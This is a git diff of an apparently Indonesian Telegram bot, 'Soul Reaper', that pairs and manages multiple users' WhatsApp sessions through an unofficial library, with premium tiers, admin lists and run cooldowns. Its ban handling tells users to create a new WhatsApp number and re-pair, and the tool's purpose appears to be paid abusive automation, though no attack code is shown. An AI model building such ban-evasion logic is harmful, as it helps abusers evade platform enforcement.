@@ -86,7 +86,6 @@ const axios = require('axios');
 const path = require("path");
 const moment = require('moment-timezone');
 //S
-
 const {
   BOT_TOKEN,
   allowedDevelopers
@@ -101,22 +100,19 @@ process.on('uncaughtException', (err) => {
 process.on('unhandledRejection', (reason, promise) => {
   console.error('Unhandled Rejection at:', promise, 'reason:', reason);
 });
-
 function getReplyMessageId(ctx) {
   if (ctx?.message?.message_id) return ctx.message.message_id;
   if (ctx?.update?.callback_query?.message?.message_id)
     return ctx.update.callback_query.message.message_id;
-
   return undefined;
 }
-
 async function denyNotAuthorized(ctx) {
   if (ctx?.update?.callback_query) {
     try {
       await ctx.answerCbQuery();
     } catch {}
   }
-  return await ctx.reply("LU SIAPA BANGSAT?????", {
+  return await ctx.reply("Who are you??????", {
     reply_to_message_id: getReplyMessageId(ctx),
     reply_markup: {
       inline_keyboard: [
@@ -128,7 +124,6 @@ async function denyNotAuthorized(ctx) {
     }
   });
 }
-
 async function guardOwnerOnly(ctx) {
   if (!OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id)) {
     await denyNotAuthorized(ctx);
@@ -151,13 +146,11 @@ const store = makeInMemoryStore({
 const CD_FILE = path.resolve(process.cwd(), "cd.json");
 const COOLDOWN_AFTER_DONE_MS = 3 * 60 * 1000;
 const activeRunLocks = new Set();
-
 function ensureCdFile() {
   if (!fs.existsSync(CD_FILE)) {
     fs.writeFileSync(CD_FILE, JSON.stringify({}, null, 2));
   }
 }
-
 function loadCdData() {
   ensureCdFile();
   try {
@@ -169,12 +162,10 @@ function loadCdData() {
     return {};
   }
 }
-
 function saveCdData(data) {
   ensureCdFile();
   fs.writeFileSync(CD_FILE, JSON.stringify(data, null, 2));
 }
-
 function cleanupExpiredCd(data) {
   const now = Date.now();
   for (const [uid, info] of Object.entries(data)) {
@@ -197,16 +188,13 @@ function cleanupExpiredCd(data) {
   }
   return data;
 }
-
 function getUserState(userId) {
   const uid = String(userId);
   let data = loadCdData();
   data = cleanupExpiredCd(data);
   saveCdData(data);
-
   return data[uid] || null;
 }
-
 function setUserRunning(userId, payload) {
   const uid = String(userId);
   let data = loadCdData();
@@ -220,7 +208,6 @@ function setUserRunning(userId, payload) {
   };
   saveCdData(data);
 }
-
 function setUserCooldown(userId, payload) {
   const uid = String(userId);
   let data = loadCdData();
@@ -234,7 +221,6 @@ function setUserCooldown(userId, payload) {
   };
   saveCdData(data);
 }
-
 function msToHuman(ms) {
   if (ms <= 0) return "0 detik";
   const s = Math.ceil(ms / 1000);
@@ -244,13 +230,11 @@ function msToHuman(ms) {
   return `${m} menit ${r} detik`;
 }
 const PREM_FILE = path.resolve(process.cwd(), "premuserzbotZIHAR.json");
-
 function ensurePremFile() {
   if (!fs.existsSync(PREM_FILE)) {
     fs.writeFileSync(PREM_FILE, JSON.stringify({}, null, 2));
   }
 }
-
 function loadPremData() {
   ensurePremFile();
   try {
@@ -262,12 +246,10 @@ function loadPremData() {
     return {};
   }
 }
-
 function savePremData(data) {
   ensurePremFile();
   fs.writeFileSync(PREM_FILE, JSON.stringify(data, null, 2));
 }
-
 function cleanupExpiredPrem(data) {
   const now = Date.now();
   for (const [uid, info] of Object.entries(data)) {
@@ -282,7 +264,6 @@ function cleanupExpiredPrem(data) {
   }
   return data;
 }
-
 function parseDays(input) {
   if (!input) return null;
   const s = String(input)
@@ -294,13 +275,11 @@ function parseDays(input) {
   if (isNaN(days)) return null;
   return days;
 }
-
 function formatWIB(tsMs) {
   return moment(tsMs)
     .tz("Asia/Jakarta")
     .format("DD-MM-YYYY HH:mm:ss") + " WIB";
 }
-
 function addOrExtendPremiumUser(userId, days, addedBy = null) {
   const uid = String(userId);
   const now = Date.now();
@@ -327,7 +306,6 @@ function addOrExtendPremiumUser(userId, days, addedBy = null) {
     newExpiresAt
   };
 }
-
 function getPremiumInfo(userId) {
   const uid = String(userId);
   let data = loadPremData();
@@ -335,7 +313,6 @@ function getPremiumInfo(userId) {
   savePremData(data);
   return data[uid] || null;
 }
-
 function isPremiumUser(userId) {
   return !!getPremiumInfo(userId);
 }
@@ -381,22 +358,24 @@ bot.action("premiuminfo", async (ctx) => {
       expText = formatWIB(info.expiresAt);
     }
     const text = `
-╭═══════『 𝐏𝐑𝐄𝐌𝐈𝐔𝐌 𝐈𝐍𝐅𝐎 』═══════⊱
-│
-│ • Status: ${statusText}
-│ • Expired: ${expText}
-│
-├─────『 𝐅𝐈𝐓𝐔𝐑 𝐏𝐑𝐄𝐌𝐈𝐔𝐌 』
-│ • Akses semua command premium
-│ • Priority support
-│ • Unlimited penggunaan
-│ • Fitur eksklusif update
-│
-├─────『 𝐂𝐀𝐑𝐀 𝐔𝐏𝐆𝐑𝐀𝐃𝐄 』
-│ • Klik tombol “UPGRADE”
-│ • Chat admin untuk aktivasi
-│
-╰═════════════════════⊱
+┌─ ᴀᴄᴄᴏᴜɴᴛ sᴛᴀᴛᴜs
+│ • Status   : ${statusText}
+│ • Expired  : ${expText}
+└─────────────────────
+
+┌─ ᴘʀᴇᴍɪᴜᴍ ғᴇᴀᴛᴜʀᴇs
+│ ✓ Access all premium commands
+│ ✓ Priority support
+│ ✓ Unlimited usage
+│ ✓ Exclusive feature updates
+└─────────────────────
+
+┌─ ʜᴏᴡ ᴛᴏ ᴜᴘɢʀᴀᴅᴇ
+│ • Click "UPGRADE" button
+│ • Contact admin for activation
+└─────────────────────
+
+» © 𐊖𐊒𐌵𐎘 | @zihardev
 `.trim();
 
     await ctx.reply(text, {
@@ -420,20 +399,20 @@ bot.action("premiuminfo", async (ctx) => {
 });
 bot.action("cekprem_me", async (ctx) => {
   try {
-    await ctx.answerCbQuery("📊 Status premium kamu", {
+    await ctx.answerCbQuery("📊 check your account status", {
       show_alert: false
     });
     const userId = ctx.from.id;
     const info = getPremiumInfo(userId);
     if (!info) {
-      return await ctx.reply("❌ Kamu belum premium / sudah expired.", {
+      return await ctx.reply("❌ you are not a premium member / your membership has expired.", {
         reply_to_message_id: ctx.update.callback_query.message.message_id
       });
     }
     const sisaMs = info.expiresAt - Date.now();
     const sisaMenit = Math.ceil(sisaMs / 60000);
     await ctx.reply(
-      `✅ Premium aktif!\n• Expired: ${formatWIB(info.expiresAt)}\n• Sisa: ~${sisaMenit} menit`, {
+      `✅ Active premium!\n• Expired: ${formatWIB(info.expiresAt)}\n• Remaining: ~${sisaMenit} menit`, {
         reply_to_message_id: ctx.update.callback_query.message.message_id
       }
     );
@@ -441,7 +420,6 @@ bot.action("cekprem_me", async (ctx) => {
     console.error("Error cekprem_me:", error);
   }
 });
-
 function deletePremiumUser(userId) {
   const uid = String(userId);
   let data = loadPremData();
@@ -463,7 +441,6 @@ function ensureAdminsFile() {
     fs.writeFileSync(ADMINS_FILE, JSON.stringify([], null, 2));
   }
 }
-
 function loadAdmins() {
   ensureAdminsFile();
   try {
@@ -477,23 +454,19 @@ function loadAdmins() {
   }
   return adminList;
 }
-
 function saveAdmins() {
   ensureAdminsFile();
   fs.writeFileSync(ADMINS_FILE, JSON.stringify(adminList, null, 2));
 }
-
 function normalizeId(userId) {
   return String(userId)
     .trim();
 }
-
 function isAdmin(userId) {
   loadAdmins(); // selalu refresh dari file biar konsisten
   const uid = normalizeId(userId);
   return adminList.includes(uid);
 }
-
 function addAdmin(userId) {
   loadAdmins();
   const uid = normalizeId(userId);
@@ -504,7 +477,6 @@ function addAdmin(userId) {
   }
   return false;
 }
-
 function removeAdmin(userId) {
   loadAdmins();
   const uid = normalizeId(userId);
@@ -516,7 +488,6 @@ function removeAdmin(userId) {
 
   return changed;
 }
-
 let sock = null;
 let isWhatsAppConnected = false;
 const usePairingCode = true;
@@ -549,218 +520,349 @@ const OWNER_ID = (userId) => {
     return false;
   }
 };
-const startSesi = async () => {
-  let retryCount = 0;
+
+//con
+
+const userSessions = new Map(); 
+const sessionDir = path.join(__dirname, 'sessions');
+if (!fs.existsSync(sessionDir)) {
+  fs.mkdirSync(sessionDir, { recursive: true });
+}
+function getUserSessionPath(userId) {
+  const userDir = path.join(sessionDir, `user_${userId}`);
+  if (!fs.existsSync(userDir)) {
+    fs.mkdirSync(userDir, { recursive: true });
+  }
+  return userDir;
+}
+function getUserSocket(userId) {
+  const session = userSessions.get(userId);
+  if (!session || !session.isConnected) {
+    return null;
+  }
+  return session.sock;
+}
+function hasActiveSession(userId) {
+  const session = userSessions.get(userId);
+  return session && session.isConnected;
+}
+
+const startUserSession = async (userId, phoneNumber = null) => {
+  const {
+    default: makeWASocket,
+    useMultiFileAuthState,
+    DisconnectReason,
+    fetchLatestBaileysVersion
+  } = require('@whiskeysockets/baileys');
   const maxRetries = 3;
   const retryDelay = 5000;
+  let userSession = userSessions.get(userId);
+  if (!userSession) {
+    userSession = {
+      sock: null,
+      isConnected: false,
+      phoneNumber: phoneNumber,
+      retryCount: 0
+    };
+    userSessions.set(userId, userSession);
+  }
   const attemptConnection = async () => {
     try {
-      const {
-        state,
-        saveCreds
-      } = await useMultiFileAuthState('./session');
-      const {
-        version
-      } = await fetchLatestBaileysVersion();
+      const userSessionPath = getUserSessionPath(userId);
+      const { state, saveCreds } = await useMultiFileAuthState(userSessionPath);
+      const { version } = await fetchLatestBaileysVersion();
       const connectionOptions = {
         version,
         keepAliveIntervalMs: 30000,
         printQRInTerminal: false,
-        logger: pino({
-          level: "silent"
-        }),
+        logger: pino({ level: "silent" }),
         auth: state,
-        browser: ['Mac OS', 'Safari', '10.15.7'],
+        browser: ['Soul Reaper', 'Chrome', '1.0.0'],
         getMessage: async (key) => ({
           conversation: 'P',
         }),
         connectTimeoutMs: 60000,
         qrTimeout: 30000,
       };
-      sock = makeWASocket(connectionOptions);
+      const sock = makeWASocket(connectionOptions);
       sock.ev.on('creds.update', saveCreds);
-      store.bind(sock.ev);
+      userSession = userSessions.get(userId);
+      if (userSession) {
+        userSession.sock = sock;
+      }
       sock.ev.on('connection.update', async (update) => {
-        const {
-          connection,
-          lastDisconnect
-        } = update;
+        const { connection, lastDisconnect } = update;
         if (connection === 'open') {
-          isWhatsAppConnected = true;
-          whatsappUserInfo = {
-            name: sock?.user?.name,
-            id: sock?.user?.id
-          };
-          retryCount = 0;
-          const successMessage = `
-╭═══════『 𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𝐒𝐭𝐚𝐭𝐮𝐬 』═══════⊱
-│
-├─────『 𝐂𝐨𝐧𝐧𝐞𝐜𝐭𝐢𝐨𝐧 𝐒𝐮𝐜𝐜𝐞𝐬𝐬 』
-│ • Status: Connected ✅
-│ • Name: ${sock?.user?.name || 'Unknown'}
-│ • Number: ${sock?.user?.id?.split(':')[0] || 'Unknown'}
-│
-├─────『 𝐁𝐨𝐭 𝐈𝐧𝐟𝐨 』
-│ • Mode: Active
-│ • Version: 1
-│ • Type: Multi-Device
-│
-╰═════════════════════⊱`;
-          try {
-            for (const ownerId of allowedDevelopers) {
-              await bot.telegram.sendMessage(ownerId, successMessage);
+          userSession = userSessions.get(userId);
+          if (userSession) {
+            userSession.isConnected = true;
+            userSession.retryCount = 0;
+            if (!userSession.phoneNumber && sock?.user?.id) {
+              userSession.phoneNumber = sock.user.id.split(':')[0];
             }
-            for (const adminId of adminList) {
-              if (!allowedDevelopers.includes(adminId)) {
-                await bot.telegram.sendMessage(adminId, successMessage);
+          }
+          const successMessage = `━━━━━━━━━━━━━━━━━━━━━━━━━━
+    ⸸ ᴄᴏɴɴᴇᴄᴛɪᴏɴ sᴛᴀᴛᴜs ⸸
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+┌─ ᴡʜᴀᴛsᴀᴘᴘ ɪɴғᴏ
+│ ✓ Status    : Connected
+│ ✓ Name      : ${sock?.user?.name || 'Unknown'}
+│ ✓ Number    : <spoiler>${sock?.user?.id?.split(':')[0] || 'Unknown'}</spoiler>
+└─────────────────────
+
+┌─ sʏsᴛᴇᴍ ɪɴғᴏ
+│ • Mode      : Active
+│ • Version   : 2.0
+│ • Type      : Multi-Device
+└─────────────────────
+
+┌─ ᴜsᴇʀ ɪɴғᴏ
+│ • User ID   : <spoiler>${userId}</spoiler>
+└─────────────────────
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+» © 𐊖𐊒𐌵𐎘 | @zihardev`;
+
+          try {
+            await bot.telegram.sendMessage(userId, successMessage, {
+              parse_mode: "HTML"
+            });
+            if (allowedDevelopers.includes(userId) || adminList.includes(userId)) {
+              for (const ownerId of allowedDevelopers) {
+                if (ownerId !== userId) {
+                  await bot.telegram.sendMessage(ownerId, `✅ User ${userId} connected to WhatsApp`, {
+                    parse_mode: "HTML"
+                  });
+                }
               }
             }
           } catch (error) {
-            console.error('Error sending connect notification:', error);
+            console.error(`Error sending connect notification to user ${userId}:`, error);
           }
-          console.log(chalk.white.bold(`
-╭─────────────────
-┃   ${chalk.green.bold('WHATSAPP CONNECTED')}
-╰─────────────────`));
+          console.log(chalk.green.bold(`✅ User ${userId} WhatsApp Connected`));
         }
         if (connection === 'close') {
-          isWhatsAppConnected = false;
-          whatsappUserInfo = null;
+          userSession = userSessions.get(userId);
+          if (userSession) {
+            userSession.isConnected = false;
+          }
           const statusCode = lastDisconnect?.error?.output?.statusCode;
           const shouldReconnect = statusCode !== DisconnectReason.loggedOut;
           const isBanned = statusCode === 401 ||
             lastDisconnect?.error?.message?.includes('banned') ||
             lastDisconnect?.error?.message?.includes('Block');
           if (isBanned) {
-            const bannedMessage = `
-╭═══════『 𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𝐁𝐚𝐧𝐧𝐞𝐝 』═══════⊱
-│
-├─────『 𝐒𝐭𝐚𝐭𝐮𝐬 』
-│ • Status: Account Banned ⛔
-│ • Time: ${new Date().toLocaleString()}
-│
-├─────『 𝐀𝐜𝐭𝐢𝐨𝐧 』
+            const bannedMessage = `━━━━━━━━━━━━━━━━━━━━━━━━━━
+    ⸸ ᴀᴄᴄᴏᴜɴᴛ ʙᴀɴɴᴇᴅ ⸸
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+┌─ sᴛᴀᴛᴜs
+│ ✗ Status    : Account Banned ⛔
+│ ✗ Time      : ${new Date().toLocaleString()}
+│ ✗ User ID   : <spoiler>${userId}</spoiler>
+└─────────────────────
+
+┌─ ᴀᴄᴛɪᴏɴ
 │ • Auto deleting session
 │ • Create new WhatsApp number
-│
-╰═════════════════════⊱`;
+└─────────────────────
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+» © 𐊖𐊒𐌵𐎘 | @zihardev`;
             try {
+              await bot.telegram.sendMessage(userId, bannedMessage, {
+                parse_mode: "HTML"
+              });
               for (const ownerId of allowedDevelopers) {
-                await bot.telegram.sendMessage(ownerId, bannedMessage);
-              }
-              const sessionPath = './session';
-              if (fs.existsSync(sessionPath)) {
-                fs.rmSync(sessionPath, {
-                  recursive: true,
-                  force: true
-                });
-                const deleteMessage = `
-╭═══════『 𝐒𝐞𝐬𝐬𝐢𝐨𝐧 𝐃𝐞𝐥𝐞𝐭𝐞𝐝 』═══════⊱
-│
-├─────『 𝐒𝐭𝐚𝐭𝐮𝐬 』
-│ • Session cleared ✅
-│ • Ready for new pairing
-│
-├─────『 𝐍𝐞𝐱𝐭 𝐒𝐭𝐞𝐩 』
-│ • Use /addpairing with new number
-│
-╰═════════════════════⊱`;
-                for (const ownerId of allowedDevelopers) {
-                  await bot.telegram.sendMessage(ownerId, deleteMessage);
+                if (ownerId !== userId) {
+                  await bot.telegram.sendMessage(ownerId, `⛔ User ${userId} account banned`, {
+                    parse_mode: "HTML"
+                  });
                 }
               }
+              const userSessionPath = getUserSessionPath(userId);
+              if (fs.existsSync(userSessionPath)) {
+                fs.rmSync(userSessionPath, { recursive: true, force: true });                
+                const deleteMessage = `━━━━━━━━━━━━━━━━━━━━━━━━━━
+    ⸸ sᴇssɪᴏɴ ᴅᴇʟᴇᴛᴇᴅ ⸸
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+┌─ sᴛᴀᴛᴜs
+│ ✓ Session cleared ✅
+│ ✓ Ready for new pairing
+└─────────────────────
+
+┌─ ɴᴇxᴛ sᴛᴇᴘ
+│ • Use /addpairing with new number
+└─────────────────────
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+» © 𐊖𐊒𐌵𐎘 | @zihardev`;
+                await bot.telegram.sendMessage(userId, deleteMessage, {
+                  parse_mode: "HTML"
+                });
+              }
+              userSessions.delete(userId);        
+              console.log(chalk.red.bold(`⛔ User ${userId} account banned - session deleted`));
               return;
             } catch (error) {
-              console.error('Error handling ban:', error);
+              console.error(`Error handling ban for user ${userId}:`, error);
             }
           }
-          if (retryCount < maxRetries && shouldReconnect) {
-            retryCount++;
-            const disconnectMessage = `
-╭═══════『 𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𝐒𝐭𝐚𝐭𝐮𝐬 』═══════⊱
-│
-├─────『 𝐂𝐨𝐧𝐧𝐞𝐜𝐭𝐢𝐨𝐧 𝐋𝐨𝐬𝐭 』
-│ • Status: Disconnected ❌
-│ • Time: ${new Date().toLocaleString()}
-│
-├─────『 𝐈𝐧𝐟𝐨 』
-│ • Attempt: ${retryCount}/${maxRetries}
-│ • Auto Reconnect: Yes
-│
-╰═════════════════════⊱`;
+          if (userSession && userSession.retryCount < maxRetries && shouldReconnect) {
+            userSession.retryCount++;
+            const disconnectMessage = `━━━━━━━━━━━━━━━━━━━━━━━━━━
+    ⸸ ᴄᴏɴɴᴇᴄᴛɪᴏɴ ʟᴏsᴛ ⸸
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+┌─ sᴛᴀᴛᴜs
+│ ✗ Status         : Disconnected ❌
+│ ✗ Time           : ${new Date().toLocaleString()}
+│ ✗ User ID        : <spoiler>${userId}</spoiler>
+└─────────────────────
+
+┌─ ɪɴғᴏ
+│ • Attempt        : ${userSession.retryCount}/${maxRetries}
+│ • Auto Reconnect : Yes
+└─────────────────────
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+» © 𐊖𐊒𐌵𐎘 | @zihardev`;
             try {
-              for (const ownerId of allowedDevelopers) {
-                await bot.telegram.sendMessage(ownerId, disconnectMessage);
-              }
+              await bot.telegram.sendMessage(userId, disconnectMessage, {
+                parse_mode: "HTML"
+              });
             } catch (error) {
-              console.error('Error sending disconnect notification:', error);
+              console.error(`Error sending disconnect notification to user ${userId}:`, error);
             }
-            console.log(chalk.white.bold(`
-╭─────────────────
-┃   ${chalk.yellow.bold(`RETRY ATTEMPT ${retryCount}/${maxRetries}`)}
-╰─────────────────`));
+            console.log(chalk.yellow.bold(`🔄 User ${userId} Retry ${userSession.retryCount}/${maxRetries}`));
             await new Promise(resolve => setTimeout(resolve, retryDelay));
             return attemptConnection();
           }
-          if (retryCount >= maxRetries) {
-            const maxRetriesMessage = `
-╭═══════『 𝐂𝐨𝐧𝐧𝐞𝐜𝐭𝐢𝐨𝐧 𝐅𝐚𝐢𝐥𝐞𝐝 』═══════⊱
-│
-├─────『 𝐒𝐭𝐚𝐭𝐮𝐬 』
-│ • Max retries reached ❌
-│ • Failed to connect ${maxRetries}x
-│ • Possible account issue
-│
-├─────『 𝐀𝐜𝐭𝐢𝐨𝐧 』
+          if (userSession && userSession.retryCount >= maxRetries) {
+            const maxRetriesMessage = `━━━━━━━━━━━━━━━━━━━━━━━━━━
+    ⸸ ᴄᴏɴɴᴇᴄᴛɪᴏɴ ғᴀɪʟᴇᴅ ⸸
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+┌─ sᴛᴀᴛᴜs
+│ ✗ Max retries reached ❌
+│ ✗ Failed to connect ${maxRetries}x
+│ ✗ Possible account issue
+│ ✗ User ID : <spoiler>${userId}</spoiler>
+└─────────────────────
+
+┌─ ᴀᴄᴛɪᴏɴ
 │ • Auto clearing session...
-│
-╰═════════════════════⊱`;
+└─────────────────────
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+» © 𐊖𐊒𐌵𐎘 | @zihardev`;
+
             try {
+              await bot.telegram.sendMessage(userId, maxRetriesMessage, {
+                parse_mode: "HTML"
+              });
+
+              // Send to owner
               for (const ownerId of allowedDevelopers) {
-                await bot.telegram.sendMessage(ownerId, maxRetriesMessage);
-              }
-              const sessionPath = './session';
-              if (fs.existsSync(sessionPath)) {
-                fs.rmSync(sessionPath, {
-                  recursive: true,
-                  force: true
-                });
-                const clearMessage = `
-╭═══════『 𝐒𝐞𝐬𝐬𝐢𝐨𝐧 𝐂𝐥𝐞𝐚𝐫𝐞𝐝 』═══════⊱
-│
-├─────『 𝐒𝐭𝐚𝐭𝐮𝐬 』
-│ • Session deleted ✅
-│ • System ready for new setup
-│
-├─────『 𝐍𝐞𝐱𝐭 𝐒𝐭𝐞𝐩 』
-│ • Use /addpairing to connect new number
-│
-╰═════════════════════⊱`;
-                for (const ownerId of allowedDevelopers) {
-                  await bot.telegram.sendMessage(ownerId, clearMessage);
+                if (ownerId !== userId) {
+                  await bot.telegram.sendMessage(ownerId, `❌ User ${userId} max retries reached`, {
+                    parse_mode: "HTML"
+                  });
                 }
               }
+              const userSessionPath = getUserSessionPath(userId);
+              if (fs.existsSync(userSessionPath)) {
+                fs.rmSync(userSessionPath, { recursive: true, force: true });
+
+                const clearMessage = `━━━━━━━━━━━━━━━━━━━━━━━━━━
+    ⸸ sᴇssɪᴏɴ ᴄʟᴇᴀʀᴇᴅ ⸸
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+┌─ sᴛᴀᴛᴜs
+│ ✓ Session deleted ✅
+│ ✓ System ready for new setup
+└─────────────────────
+
+┌─ ɴᴇxᴛ sᴛᴇᴘ
+│ • Use /addpairing to connect new number
+└─────────────────────
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+» © 𐊖𐊒𐌵𐎘 | @zihardev`;
+                await bot.telegram.sendMessage(userId, clearMessage, {
+                  parse_mode: "HTML"
+                });
+              }
+              userSessions.delete(userId);             
+              console.log(chalk.red.bold(`❌ User ${userId} max retries - session deleted`));
             } catch (error) {
-              console.error('Error handling max retries:', error);
+              console.error(`Error handling max retries for user ${userId}:`, error);
             }
+          }
+          if (!shouldReconnect) {
+            console.log(chalk.red.bold(`🔴 User ${userId} logged out`));
+            userSessions.delete(userId);
           }
         }
       });
+      return sock;
     } catch (error) {
-      console.error('Connection error:', error);
-      if (retryCount < maxRetries) {
-        retryCount++;
-        console.log(chalk.white.bold(`
-╭─────────────────
-┃   ${chalk.yellow.bold(`RETRY ATTEMPT ${retryCount}/${maxRetries}`)}
-╰─────────────────`));
+      console.error(`Connection error for user ${userId}:`, error);      
+      userSession = userSessions.get(userId);
+      if (userSession && userSession.retryCount < maxRetries) {
+        userSession.retryCount++;
+        console.log(chalk.yellow.bold(`🔄 User ${userId} Retry ${userSession.retryCount}/${maxRetries}`));
         await new Promise(resolve => setTimeout(resolve, retryDelay));
         return attemptConnection();
+      } else {
+        try {
+          await bot.telegram.sendMessage(userId, '❌ Failed to initialize connection. Please try /addpairing again.', {
+            parse_mode: "HTML"
+          });
+        } catch (e) {
+          console.error(`Error sending failure message to user ${userId}:`, e);
+        }
+        userSessions.delete(userId);
       }
     }
   };
+
   return attemptConnection();
 };
+const loadExistingSessions = async () => {
+  if (!fs.existsSync(sessionDir)) {
+    return;
+  }
+  
+  const userDirs = fs.readdirSync(sessionDir).filter(dir => dir.startsWith('user_'));
+  
+  if (userDirs.length === 0) {
+    console.log(chalk.yellow.bold('📂 No existing sessions found'));
+    return;
+  }
+  
+  console.log(chalk.cyan.bold(`📂 Loading ${userDirs.length} existing sessions...`));
+  
+  for (const userDir of userDirs) {
+    const userId = parseInt(userDir.replace('user_', ''));
+    if (!isNaN(userId)) {
+      try {
+        console.log(chalk.gray(`  Loading session for user ${userId}...`));
+        await startUserSession(userId);
+      } catch (error) {
+        console.error(chalk.red(`  Failed to load session for user ${userId}:`, error.message));
+      }
+    }
+  }
+  
+  console.log(chalk.green.bold(`✅ Loaded ${userDirs.length} sessions`));
+};
+
+// ============================================
+// STARTUP SEQUENCE
+// ============================================
 (async () => {
   console.log(chalk.whiteBright.bold(`
 ╭──────────────────────────────────────────────╮
@@ -769,101 +871,27 @@ const startSesi = async () => {
 │     ████████████████████████████████████     │    
 │     ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀     │
 │                                              │
-│        Welcome to Soul Crack         │
-│     @zihardev    │
+│          Welcome to Soul Reaper v2.0         │
+│           Multi-Session System               │
+│               @zihardev                      │
 │                                              │
 ╰──────────────────────────────────────────────╯
 ╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮
-┃        SUKSES MEMUAT DATABASE OWNER          ┃
+┃        SUCCESSFULLY LOADED MULTI-SESSION         ┃
 ╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯`));
+  
   loadAdmins();
-  startSesi();
- // addDeviceToList(BOT_TOKEN, BOT_TOKEN);
+  
+  // Load existing sessions
+  await loadExistingSessions();
+  
+  console.log(chalk.green.bold('\n✅ Bot is ready!\n'));
 })();
 
-bot.command("removeallbot", async (ctx) => {
-  await ctx.telegram.sendChatAction(ctx.chat.id, 'choose_sticker');
-  if (!OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id)) {
-    await ctx.telegram.sendSticker(ctx.chat.id,
-      'CAACAgUAAxkBAAEODo9n0ChtIFw4aeY8nOWm4BrF1fbthgAC7AYAAoNJ-VUl9_10WPFNjzYE', {
-        reply_to_message_id: ctx.message.message_id
-      });
-  }
-  try {
-    const confirmationMessage = `
-╭═══════『 ⚠️ 𝐖𝐀𝐑𝐍𝐈𝐍𝐆 』═══════⊱
-│
-├─────『 𝐂𝐨𝐧𝐟𝐢??𝐦𝐚𝐭𝐢𝐨𝐧 』
-│ • Action: Remove All Bot Sessions
-│ • Impact: All WhatsApp connections will be lost
-│ • Status: Awaiting Confirmation
-│
-├─────『 ??𝐨𝐭𝐞 』
-│ • This action cannot be undone
-│ • You'll need to pair again after this
-│
-╰═════════════════════⊱`;
-    await ctx.reply(confirmationMessage, {
-      reply_markup: {
-        inline_keyboard: [
-          [{
-              text: "✅ Yes, Remove All",
-              callback_data: "confirm_remove"
-            },
-            {
-              text: "❌ Cancel",
-              callback_data: "cancel_remove"
-            }
-          ]
-        ]
-      }
-    });
-  } catch (error) {
-    console.error('Remove Bot Error:', error);
-    await ctx.reply("❌ Terjadi kesalahan saat mencoba menghapus session.");
-  }
-});
-bot.action('confirm_remove', async (ctx) => {
-  try {
-    await ctx.deleteMessage();
-    if (sock && isWhatsAppConnected) {
-      await sock.logout();
-      isWhatsAppConnected = false;
-      whatsappUserInfo = null;
-    }
-    const sessionPath = './session';
-    if (fs.existsSync(sessionPath)) {
-      fs.rmSync(sessionPath, {
-        recursive: true,
-        force: true
-      });
-    }
-    const successMessage = `
-╭═══════『 ✅ 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』═══════⊱
-│
-├─────『 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐬𝐢 』
-│ • Action: Remove All Bot Sessions
-│ • Status: Completed Successfully
-│
-├─────『 𝐍𝐞𝐱𝐭 𝐒𝐭𝐞𝐩 』
-│ • Use /addpairing to connect new bot
-│
-╰═════════════════════⊱`;
-    await ctx.reply(successMessage);
-  } catch (error) {
-    console.error('Remove Session Error:', error);
-    await ctx.reply("❌ Terjadi kesalahan saat menghapus session.");
-  }
-});
-bot.action('cancel_remove', async (ctx) => {
-  await ctx.deleteMessage();
-  await ctx.reply("⚠️ Penghapusan session dibatalkan.");
-});
-
+//CMD
 bot.command("addpairing", async (ctx) => {
-  await ctx.telegram.sendChatAction(ctx.chat.id, 'typing');
-  if (!(await guardOwnerOrAdmin(ctx))) return;
-  
+  await ctx.telegram.sendChatAction(ctx.chat.id, 'typing');  
+  const userId = ctx.from.id;
   function formatPhoneNumber(number) {
     let cleaned = number.replace(/[^0-9]/g, '');
     cleaned = cleaned.replace(/^\+/, '');
@@ -877,32 +905,57 @@ bot.command("addpairing", async (ctx) => {
   }
   const args = ctx.message.text.split(/\s+/);
   if (args.length < 2) {
-    const helpMessage = `
-╭═══════『 𝐏𝐚𝐢𝐫𝐢𝐧𝐠 𝐆𝐮𝐢𝐝𝐞 』═══════⊱
-│
-├─────『 𝐅𝐨??𝐦𝐚𝐭 』
-│ • /addpairing 628xxxxxxxxxx
-│ • /addpairing +1234567890    
-│ • /addpairing 0812xxxxx
-│
-├─────『 𝐒𝐮𝐩𝐩𝐨𝐫𝐭𝐞𝐝 』
-│ • Indonesian numbers (62/0)
-│ • International numbers
-│ • With/without country code
-│
-╰═════════════════════⊱`;
+    const helpMessage = `━━━━━━━━━━━━━━━━━━━━━━━━━━
+    ⸸ ᴘᴀɪʀɪɴɢ ɢᴜɪᴅᴇ ⸸
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+ғᴏʀᴍᴀᴛ:
+• /addpairing 628xxxxxxxxxx
+• /addpairing +1234567890    
+• /addpairing 0812xxxxx
+
+sᴜᴘᴘᴏʀᴛᴇᴅ:
+✓ Indonesian numbers (62/0)
+✓ International numbers
+✓ With/without country code
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+» © 𐊖𐊒𐌵𐎘 | @zihardev`;
     return await ctx.reply(helpMessage);
   }
-  let phoneNumber = args.slice(1)
-    .join('');
+
+  let phoneNumber = args.slice(1).join('');
   phoneNumber = formatPhoneNumber(phoneNumber);
+
   try {
-    if (!sock || !isWhatsAppConnected) {
-      await ctx.reply("⏳ Menginisialisasi koneksi WhatsApp...");
-      await startSesi();
-      await new Promise(resolve => setTimeout(resolve, 3000));
+    let userSession = userSessions.get(userId);    
